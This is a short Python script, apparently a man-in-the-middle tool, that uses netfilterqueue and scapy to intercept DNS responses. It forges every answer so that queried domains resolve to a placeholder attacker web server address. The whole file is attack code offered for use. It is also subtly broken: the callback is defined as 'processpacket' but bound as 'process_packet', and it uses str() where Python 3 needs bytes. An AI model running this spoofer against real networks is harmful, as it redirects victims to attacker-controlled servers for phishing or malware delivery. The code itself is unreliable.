#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

def processpacket(packet):
    # convert the NetFilter packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    # check if the request has a DNS Resource Record and a qname in a DNS Question Record (containing the requested URL)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if qname:
            # forge the Response and inject it
            answer = scapy.DNSRR(rrname=qname, rdata="GIVE YOUR WEBSERVERS IP HERE")
            scapy_packet[scapy.DNS].an = answer
            # set the number of answers according to the forged Responses number
            scapy_packet[scapy.DNS].ancount = 1
            # delete the checksum and the length values of the forged packet to avoid packet corruption
            # from both IP and Transport headers
            # scapy recalculates these values
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            #reconvert the scapy packet
            packet.set_payload(str(scapy_packet))

            print("[+] Spoofing target\n")
            
    # .drop or .access the packet
    packet.accept()

# create the object, bind to the iptables command and run
queue = netfilterqueue.NetfilterQueue()
queue.bind(1337, process_packet)
queue.run()
